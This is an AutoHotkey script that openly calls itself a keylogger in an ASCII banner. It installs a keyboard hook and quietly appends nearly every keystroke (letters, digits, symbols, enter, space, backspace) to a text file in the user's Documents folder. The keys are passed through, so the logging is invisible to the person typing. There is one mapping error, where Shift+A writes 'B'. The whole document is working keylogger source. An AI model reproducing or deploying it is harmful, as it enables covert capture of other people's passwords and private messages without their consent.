;|keylogger||SEARCHINDICATOR|
;     _              _
;    | |            | |
;    | | _____ _   _| | ___   __ _  __ _  ___ _ __
;    | |/ / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
;    |   <  __/ |_| | | (_) | (_| | (_| |  __/ |
;    |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|
;               __/ |         __/ | __/ |
;              |___/         |___/ |___/
Keyloggerino:
; return
;
; AutoHotkey Version: 1.x
; Language:       English
; Platform:       Win9x/NT
; Author:         A.N.Other <myemail@nowhere.com>
;https://www.evernote.com/shard/s236/nl/30918519/01ffeb0b-c1ad-47c5-872a-9a2b1881c61b
; Script Function:
;     Template script (you can customize this template by editing "ShellNew\Template.ahk" in your Windows folder)
;
#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_MyDocuments%  ; Ensures a consistent starting directory.
#Persistent
#InstallKeybdHook
~a::fileappend, a, KeystrokeForSearch.txt
~b::fileappend, b, KeystrokeForSearch.txt
~c::fileappend, c, KeystrokeForSearch.txt
~d::fileappend, d, KeystrokeForSearch.txt
~e::fileappend, e, KeystrokeForSearch.txt
~f::fileappend, f, KeystrokeForSearch.txt
~g::fileappend, g, KeystrokeForSearch.txt
~h::fileappend, h, KeystrokeForSearch.txt
~i::fileappend, i, KeystrokeForSearch.txt
~j::fileappend, j, KeystrokeForSearch.txt
~k::fileappend, k, KeystrokeForSearch.txt
~l::fileappend, l, KeystrokeForSearch.txt
~m::fileappend, m, KeystrokeForSearch.txt
~n::fileappend, n, KeystrokeForSearch.txt
~o::fileappend, o, KeystrokeForSearch.txt
~p::fileappend, p, KeystrokeForSearch.txt
~q::fileappend, q, KeystrokeForSearch.txt
~r::fileappend, r, KeystrokeForSearch.txt
~s::fileappend, s, KeystrokeForSearch.txt
~t::fileappend, t, KeystrokeForSearch.txt
~u::fileappend, u, KeystrokeForSearch.txt
~v::fileappend, v, KeystrokeForSearch.txt
~w::fileappend, w, KeystrokeForSearch.txt
~x::fileappend, x, KeystrokeForSearch.txt
~y::fileappend, y, KeystrokeForSearch.txt
~z::fileappend, z, KeystrokeForSearch.txt
~+A::fileappend, B, KeystrokeForSearch.txt
~+B::fileappend, B, KeystrokeForSearch.txt
~+C::fileappend, C, KeystrokeForSearch.txt
~+D::fileappend, D, KeystrokeForSearch.txt
~+E::fileappend, E, KeystrokeForSearch.txt
~+F::fileappend, F, KeystrokeForSearch.txt
~+G::fileappend, G, KeystrokeForSearch.txt
~+H::fileappend, H, KeystrokeForSearch.txt
~+I::fileappend, I, KeystrokeForSearch.txt
~+J::fileappend, J, KeystrokeForSearch.txt
~+K::fileappend, K, KeystrokeForSearch.txt
~+L::fileappend, L, KeystrokeForSearch.txt
~+M::fileappend, M, KeystrokeForSearch.txt
~+N::fileappend, N, KeystrokeForSearch.txt
~+O::fileappend, O, KeystrokeForSearch.txt
~+P::fileappend, P, KeystrokeForSearch.txt
~+Q::fileappend, Q, KeystrokeForSearch.txt
~+R::fileappend, R, KeystrokeForSearch.txt
~+S::fileappend, S, KeystrokeForSearch.txt
~+T::fileappend, T, KeystrokeForSearch.txt
~+U::fileappend, U, KeystrokeForSearch.txt
~+V::fileappend, V, KeystrokeForSearch.txt
~+W::fileappend, W, KeystrokeForSearch.txt
~+X::fileappend, X, KeystrokeForSearch.txt
~+Y::fileappend, Y, KeystrokeForSearch.txt
~+Z::fileappend, Z, KeystrokeForSearch.txt
~`::fileappend, `, KeystrokeForSearch.txt
~!::fileappend, !, KeystrokeForSearch.txt
~@::fileappend, @, KeystrokeForSearch.txt
~#::fileappend, #, KeystrokeForSearch.txt
~$::fileappend, $, KeystrokeForSearch.txt
~^::fileappend, ^, KeystrokeForSearch.txt
~&::fileappend, &, KeystrokeForSearch.txt
~*::fileappend, *, KeystrokeForSearch.txt
~(::fileappend, (, KeystrokeForSearch.txt
~)::fileappend, ), KeystrokeForSearch.txt
~-::fileappend, -, KeystrokeForSearch.txt
~_::fileappend, _, KeystrokeForSearch.txt
~=::fileappend, =, KeystrokeForSearch.txt
~+::fileappend, +, KeystrokeForSearch.txt
~[::fileappend, [, KeystrokeForSearch.txt
~{::fileappend, {, KeystrokeForSearch.txt
~]::fileappend, ], KeystrokeForSearch.txt
~}::fileappend, }, KeystrokeForSearch.txt
~\::fileappend, \, KeystrokeForSearch.txt
~|::fileappend, |, KeystrokeForSearch.txt
~;::fileappend, `;, KeystrokeForSearch.txt
~'::fileappend, ', KeystrokeForSearch.txt
~<::fileappend, <, KeystrokeForSearch.txt
~.::fileappend, ., KeystrokeForSearch.txt
~>::fileappend, >, KeystrokeForSearch.txt
~/::fileappend, /, KeystrokeForSearch.txt
~?::fileappend, ?, KeystrokeForSearch.txt
~enter::fileappend, `n, KeystrokeForSearch.txt
~space::fileappend, %A_Space%, KeystrokeForSearch.txt
~tab::fileappend, {tab}, KeystrokeForSearch.txt
~backspace::fileappend, {Back}, KeystrokeForSearch.txt
~1::fileappend, 1, KeystrokeForSearch.txt
~2::fileappend, 2, KeystrokeForSearch.txt
~3::fileappend, 3, KeystrokeForSearch.txt
~4::fileappend, 4, KeystrokeForSearch.txt
~5::fileappend, 5, KeystrokeForSearch.txt
~6::fileappend, 6, KeystrokeForSearch.txt
~7::fileappend, 7, KeystrokeForSearch.txt
~8::fileappend, 8, KeystrokeForSearch.txt
~9::fileappend, 9, KeystrokeForSearch.txt
~0::fileappend, 0, KeystrokeForSearch.txt
return